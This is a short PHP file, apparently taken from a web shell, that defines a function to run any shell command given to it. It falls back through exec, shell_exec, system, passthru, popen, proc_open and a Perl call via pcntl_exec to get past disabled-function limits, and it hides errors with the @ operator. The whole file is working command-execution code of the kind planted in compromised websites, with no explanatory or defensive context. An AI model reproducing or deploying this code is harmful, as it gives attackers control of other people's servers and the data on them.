<?

function execute($cfe){
    $res = '';
    if (!empty($cfe)){

        if(@function_exists('exec')){
            @exec($cfe,$res);
            $res = join("\n",$res);}

        elseif(@function_exists('shell_exec')){
            $res = @shell_exec($cfe);}

        elseif(@function_exists('system')){
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();}

        elseif(@function_exists('passthru')){
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();}

        elseif(@is_resource($f = @popen($cfe,"r"))){
            $res = "";
            if(@function_exists('fread') &&@function_exists('feof')){
                while(!@feof($f)){
                    $res.= @fread($f,1024);}}
            else if(@function_exists('fgets') &&@function_exists('feof')){
                while(!@feof($f)){
                    $res.= @fgets($f,1024);}}
            @pclose($f);}

        elseif(@is_resource($f = @proc_open($cfe,array(1 =>array("pipe","w")),$pipes))){
            $res = "";
            if(@function_exists('fread') &&@function_exists('feof')){
                while(!@feof($pipes[1])){
                    $res.= @fread($pipes[1],1024);}}
            else if(@function_exists('fgets') &&@function_exists('feof')){
                while(!@feof($pipes[1])){
                    $res.= @fgets($pipes[1],1024);}}
            @proc_close($f);}

        elseif(@function_exists('pcntl_exec')&&@function_exists('pcntl_fork')){
            $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
            $pid = @pcntl_fork();
            if ($pid == -1) {
                $res.= '[-] Could not children fork. Exit';}
            else if ($pid){
                if (@pcntl_wifexited($status)){
                    $res.= '[+] Done! Command "'.$cfe.'" successfully executed.';}
                else {
                    $res.= '[-] Error. Command incorrect.';}}
            else {
                $cfe = array(" -e 'system(\"$cfe\")'");
                if(@pcntl_exec('/usr/bin/perl',$cfe)) exit(0);
                if(@pcntl_exec('/usr/local/bin/perl',$cfe)) exit(0);
                die();}}}
    return $res;}

?>
